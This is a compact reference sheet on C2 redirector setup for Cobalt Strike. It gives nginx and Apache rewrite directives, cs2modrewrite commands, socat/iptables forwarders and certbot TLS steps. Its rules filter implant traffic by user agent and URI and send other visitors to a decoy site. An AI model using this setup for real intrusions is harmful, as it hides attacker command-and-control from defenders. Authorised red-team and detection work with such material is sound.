# C2 Redirector — Directives & Tooling Reference

## nginx reverse-proxy directives

| Directive | Purpose |
|-----------|---------|
| `location ~ ^/regex` | Match profile C2 URIs |
| `proxy_pass https://TEAMSERVER;` | Forward matched traffic to team server |
| `proxy_ssl_verify off;` | Skip cert verification to backend |
| `proxy_set_header Host $host;` | Preserve Host header |
| `if ($http_user_agent != "...") { return 302 ...; }` | UA validation |
| `return 302 https://DECOY/;` | Divert non-C2 to a benign site |

## Apache mod_rewrite directives

| Directive | Purpose |
|-----------|---------|
| `RewriteEngine On` | Enable rewriting |
| `SSLProxyEngine On` | Allow HTTPS proxying |
| `RewriteCond %{HTTP_USER_AGENT} "..."` | Match implant User-Agent |
| `RewriteCond %{REQUEST_URI} ^/c2/path` | Match profile URIs |
| `RewriteRule ^.*$ https://TEAMSERVER%{REQUEST_URI} [P,L]` | Proxy match to backend |
| `RewriteRule ^.*$ https://DECOY/ [R=302,L]` | Redirect non-match to decoy |

Required modules: `rewrite proxy proxy_http ssl headers` (`a2enmod`).

## cs2modrewrite invocation

```bash
# Apache rules from a Cobalt Strike profile
python3 cs2modrewrite.py -i PROFILE.profile -c https://TEAMSERVER \
  -r https://DECOY -o redirect.rules

# nginx config
python3 cs2nginx.py -i PROFILE.profile -c https://TEAMSERVER \
  -r https://DECOY -H your.domain > c2.conf
```

| Flag | Meaning |
|------|---------|
| `-i` | Input Cobalt Strike malleable profile |
| `-c` | C2 team server URL (proxy target) |
| `-r` | Redirect URL for non-matching requests |
| `-o` | Output rules file (Apache) |
| `-H` | Hostname (nginx) |

## Dumb-pipe forwarders

```bash
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:TEAMSERVER:443
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination TEAMSERVER:443
```

## TLS (certbot)

```bash
certbot --nginx -d your.domain --agree-tos -m ops@you --redirect
certbot renew --dry-run
```

## External References

- mod_rewrite flags ([P], [R], [L]): https://httpd.apache.org/docs/current/rewrite/flags.html
- nginx proxy module: https://nginx.org/en/docs/http/ngx_http_proxy_module.html
- cs2modrewrite: https://github.com/threatexpress/cs2modrewrite
